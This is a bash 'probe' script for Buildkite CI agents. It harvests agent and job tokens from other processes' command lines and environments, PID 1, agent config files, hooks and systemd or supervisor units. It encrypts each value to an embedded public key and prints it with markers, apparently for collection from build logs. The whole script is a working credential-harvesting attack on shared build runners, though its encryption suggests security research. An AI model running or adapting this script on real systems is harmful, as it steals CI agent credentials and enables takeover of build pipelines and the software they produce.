#!/bin/bash
# a632 probe v2b: config/env token inventory; all values RSA-encrypted, never plaintext
set -u
PUB=/tmp/.a632pub.$$
cat > "$PUB" <<'A632PUBEOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvsYiCNEL69IkUinb45Id
ZQJZTtR1aqcW1x3sWVg9ZpNnVw2T8xFOpd7xcHnuRuDJjpVkFlBE+sraDq3WdhB7
pnabZtIbLnQc+G6Y8sXmCwbWUwxjz9E5u87DB1o5xPiEyQMeSTNF5SYPPcY4H9eq
jDlHHe8cAA/LpnNcQ/Meluy39CYwHFPMjJGK10X2apBZBJQJxl79TgMx5jFYZx8R
6FAeH8dnEHTWPZEytzegqe0AKKaQwBM7fpd+3UMxnC5NVn3hfE6g0yCvRzyiAELs
Pe6OCiiZ8XBdHHOtoOpE+YarL9U7Q4x7zc52JdojQ7dLS7xySApfHUwE+xa4fvzr
XQIDAQAB
-----END PUBLIC KEY-----
A632PUBEOF
encrypt() {
  v="$1"; label="$2"
  [ -z "$v" ] && return 0
  h=$(printf '%s' "$v" | sha256sum | cut -c1-12)
  c=$(printf '%s' "$v" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" 2>/dev/null | base64 -w0)
  echo "A632ENC:$label:$h:${c:-ENCFAIL}"
}
echo "A632B_BEGIN"
id; hostname
echo "CTX cluster=${BUILDKITE_CLUSTER_ID:-none} queue=${BUILDKITE_AGENT_META_DATA_QUEUE:-none} agent=${BUILDKITE_AGENT_NAME:-none}"
echo "== SRC1 cmdline token args (encrypted) =="
for p in /proc/[0-9]*; do
  if [ -r "$p/cmdline" ]; then tr '\0' '\n' < "$p/cmdline" 2>/dev/null | grep -oiE '[-]{0,2}[a-z0-9_-]*token[= ][^ ]+' | sed -E 's/^[^=]*=//; s/^[^ ]+ +//' || true; fi
done | sort -u | head -20 | while IFS= read -r v; do encrypt "$v" "cmdline"; done
echo "== SRC2 agent process env token names =="
for p in /proc/[0-9]*; do
  if [ -r "$p/environ" ]; then c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | head -c 200); case "$c" in *buildkite-agent*) tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE '^[A-Z0-9_]*TOKEN[A-Z0-9_]*=' | sed -E 's/^([^=]*)=.*/\1/' || true;; esac; fi
done | sort -u | head -40
echo "== SRC2b agent process env token values (encrypted) =="
for p in /proc/[0-9]*; do
  if [ -r "$p/environ" ]; then c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | head -c 200); case "$c" in *buildkite-agent*) tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE '^(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN|BUILDKITE_CLUSTER_TOKEN|BUILDKITE_AGENT_ACCESS_TOKEN)=' | while IFS='=' read -r k v; do encrypt "$v" "environ:$k"; done;; esac; fi
done
echo "== SRC3 cfg files =="
for f in /etc/buildkite-agent/buildkite-agent.cfg /usr/share/buildkite-agent/buildkite-agent.cfg "$HOME/.buildkite-agent/buildkite-agent.cfg"; do
  if [ -f "$f" ]; then echo "FOUND2 $f"; sha256sum "$f"; grep -E '^[[:space:]]*(token|token-env|hooks-path|name)' "$f" | sed 's/=.*/=<redacted>/' || true; t=$(grep -E '^[[:space:]]*token[[:space:]]*=' "$f" | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/'); encrypt "$t" "cfg2:$f"; fi
done
echo "== SRC4 hooks =="
ls -la /hooks/ /etc/buildkite-agent/hooks/ 2>/dev/null || true
for h in /hooks/* /etc/buildkite-agent/hooks/*; do
  if [ -f "$h" ]; then echo "HOOK $h"; sha256sum "$h"; grep -oE '[A-Za-z0-9_]*(TOKEN|SECRET|PASSWORD)[A-Za-z0-9_]*=[^ ]*' "$h" 2>/dev/null | sed -E 's/=.*/=<redacted>/' || true; grep -oE 'BUILDKITE[A-Za-z0-9_]*TOKEN="?[^" ]+"?' "$h" 2>/dev/null | while IFS='=' read -r k v; do encrypt "$(printf '%s' "$v" | tr -d '"')" "hook:$k"; done; fi
done
echo "== SRC5 supervisor/systemd/default =="
for u in /etc/systemd/system/buildkite-agent*.service /lib/systemd/system/buildkite-agent*.service /etc/supervisor/conf.d/*.conf /etc/supervisor/supervisord.conf /etc/default/buildkite-agent /etc/default/buildkite*; do
  if [ -f "$u" ]; then echo "CONF $u"; sha256sum "$u"; grep -oE '[A-Za-z0-9_]*(TOKEN|SECRET)=[^ "]*' "$u" 2>/dev/null | sed -E 's/=.*/=<redacted>/' || true; grep -oE '(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)=[^ "]*' "$u" 2>/dev/null | while IFS='=' read -r k v; do encrypt "$v" "conf:$k"; done; fi
done
echo "== SRC6 pid1 =="
tr '\0' '\n' < /proc/1/cmdline 2>/dev/null | head -5 || true
tr '\0' '\n' < /proc/1/environ 2>/dev/null | grep -iE '^(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)=' | while IFS='=' read -r k v; do encrypt "$v" "pid1:$k"; done
echo "== SRC7 job env secret-shaped names =="
env | grep -iE 'TOKEN|SECRET|API_KEY|PASSWORD|CREDENTIAL|_KEY' | cut -d= -f1 | sort || true
echo "== SRC8 home =="
ls -la "$HOME" 2>/dev/null | head -25 || true
rm -f "$PUB" 2>/dev/null || true
echo "A632B_END"
